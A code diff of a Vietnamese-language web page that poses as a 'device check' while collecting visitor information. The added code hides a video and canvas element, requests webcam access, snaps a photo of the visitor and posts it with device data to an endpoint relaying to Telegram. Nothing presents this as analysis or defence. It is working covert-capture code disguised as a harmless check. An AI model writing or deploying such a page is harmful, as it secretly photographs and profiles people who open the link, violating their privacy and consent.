@@ -3,21 +3,27 @@
 <head>
   <meta charset="UTF-8" />
   <title>Kiểm tra thiết bị</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      color: #333;
+      text-align: center;
+      padding: 50px;
+    }
+    h3.ten {
+      color: #555;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #f0f0f0;
-    color: #333;
-    text-align: center;
-    padding: 50px;
-  }
-  h3.ten {
-    color: #555;
-  }
-</style>
 <body>
   <h3 class="ten">Đang kiểm tra thiết bị, vui lòng chờ...</h3>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
   <script>
     const info = {
       time: new Date().toLocaleString(),
@@ -101,14 +107,49 @@
       `.trim();
     }
 
+    async function captureImage() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        return new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0);
+              const imageData = canvas.toDataURL('image/png');
+
+              // Dừng stream sau khi chụp
+              stream.getTracks().forEach(track => track.stop());
+
+              resolve(imageData);
+            }, 1000);
+          };
+        });
+      } catch (err) {
+        console.error('Không thể truy cập camera:', err);
+        return null;
+      }
+    }
+
     async function sendToServer() {
       const text = getCaption();
+      const imageBase64 = await captureImage();
+
       try {
         const response = await fetch('/api/sendTelegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ message: text }),
+          body: JSON.stringify({
+            message: text,
+            image: imageBase64
+          }),
         });
+
         if (!response.ok) {
           const errorData = await response.json();
           console.error('Lỗi khi gửi Telegram:', errorData);
